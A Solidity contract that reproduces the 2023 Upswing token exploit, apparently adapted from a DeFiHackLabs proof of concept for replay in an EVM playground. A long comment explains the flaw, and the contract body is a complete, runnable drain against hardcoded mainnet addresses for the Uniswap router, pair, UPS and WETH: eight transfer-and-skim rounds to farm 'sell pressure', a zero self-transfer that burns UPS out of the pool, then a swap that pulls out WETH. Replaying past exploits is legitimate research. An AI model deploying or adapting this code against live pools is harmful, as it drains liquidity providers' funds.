// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Synthetic standalone exploit for the EVM Playground (2023-01-Upswing).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (UpswingExploit IS the Test contract; testExploit() uses
// Foundry's `deal(weth, address(this), 1 ether)` cheatcode to conjure 1 WETH
// out of thin air instead of a real flash loan or funding source), so there
// is no standalone contract to deploy and no flash-loan/transfer setup step
// can replicate the starting capital. This contract is a faithful,
// self-contained copy of that inline attack (testExploit -> run) so the
// playground can deploy it and record run(); the 1 WETH starting balance is
// replicated via a `dealToken` setup step in the config instead of a
// `deal()` call inside this contract. Logic and constants are copied
// verbatim from test/Upswing_exp.sol.
//
// Root cause: UpSwing (UPS) is an ERC20 with a "sell pressure" ledger.
// Every UPS transfer whose `recipient` is the Uniswap-V2 pair bumps the
// SENDER's `txCount` and adds a discounted slice of the transferred amount
// to the sender's `sellPressure[sender]` (see UpSwing._transfer:
// `if (recipient == UNIv2) { txCount[sender]++; sellPressure[sender] +=
// amount * UPSMath(txCount[sender]) / 1e10; }`). Separately, ANY holder can
// permissionlessly trigger `releasePressure(self)` by self-transferring
// amount 0 (`if (sender == recipient && amount == 0) releasePressure(sender)`).
// `releasePressure` converts `myPressure(addr)` (a leverage-amplified view of
// `sellPressure[addr]`) directly into a `_burn(UNIv2, amount)` -- i.e. it
// burns UPS OUT OF THE LIVE PAIR'S BALANCE, uncompensated by any WETH -- then
// calls `sync()` so the pair accepts the reduced UPS balance as its new
// reserve0. No transfer() ever has to actually deliver tokens to the pair
// for `sellPressure` to accrue: the attacker moves UPS into the pair via
// `transfer(pair, balance)` (crediting sellPressure because recipient ==
// UNIv2) and immediately calls `pair.skim(self)`, which sweeps the pair's
// UPS balance in excess of its cached reserves right back to the attacker --
// so the "sale" is free and reversible, but the sellPressure credit sticks.
// After 8 rounds of this free farming loop, a single zero-value self-transfer
// fires `releasePressure`, burning ~6.69e22 UPS out of the pair's real
// balance with no WETH compensation. The pool's UPS reserve collapses far
// below what `x*y=k` requires for the WETH reserve, so a final sell of the
// attacker's (never-really-spent) UPS back into the pair drains a large
// share of the pair's WETH.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ITokenUPS is IERC20 {
    function myPressure(address _address) external view returns (uint256);
}

interface IUniswapV2Pair {
    function skim(address to) external;
}

interface IUniRouterV2 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract UpswingDrain {
    IUniRouterV2 private constant uniRouter = IUniRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Pair private constant lp = IUniswapV2Pair(0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34);
    address private constant upsToken = 0x35a254223960c18B69C0526c46B013D022E93902;
    address private constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function run() external {
        // sample attack with 1 ether (starting WETH conjured via a
        // `dealToken` setup step in the playground config, mirroring the
        // test's `deal(weth, address(this), 1 ether)`)
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = upsToken;

        IERC20(weth).approve(address(uniRouter), type(uint256).max);

        uniRouter.swapExactTokensForTokens(1 ether, 0, path, address(this), block.timestamp);

        uint256 balance = IERC20(upsToken).balanceOf(address(this));
        for (uint256 i; i < 8; ++i) {
            // transfer(lp, balance): recipient == UNIv2, so UpSwing credits
            // sellPressure[address(this)] with a discounted slice of
            // `balance`, scaled by UPSMath(txCount) -- even though skim()
            // immediately hands the same UPS back below.
            IERC20(upsToken).transfer(address(lp), balance);
            // skim() sweeps the pair's UPS balance above its cached
            // reserve0 back to us -- the "sale" never actually cost us
            // any tokens, but the sellPressure credit from the transfer()
            // above is permanent.
            lp.skim(address(this));
        }

        // Self-transfer of amount 0: UpSwing._transfer's
        // `if (sender == recipient && amount == 0) releasePressure(sender)`
        // fires here. releasePressure burns myPressure(address(this)) UPS
        // directly out of the pair's balance (_burn(UNIv2, amount)) and
        // calls sync() -- no WETH is paid to compensate, so the pair's
        // UPS reserve collapses relative to its WETH reserve.
        IERC20(upsToken).transfer(address(this), 0);

        path[0] = upsToken;
        path[1] = weth;

        balance = IERC20(upsToken).balanceOf(address(this));
        IERC20(upsToken).approve(address(uniRouter), type(uint256).max);
        // Sell the (never really spent) UPS back into the now UPS-starved
        // pool. Because the pair's real UPS reserve was slashed by the
        // uncompensated burn above, this swap re-prices against a much
        // smaller UPS reserve and pays out far more WETH than the pool's
        // pre-attack depth would allow.
        uniRouter.swapExactTokensForTokens(balance, 0, path, address(this), block.timestamp);
    }
}
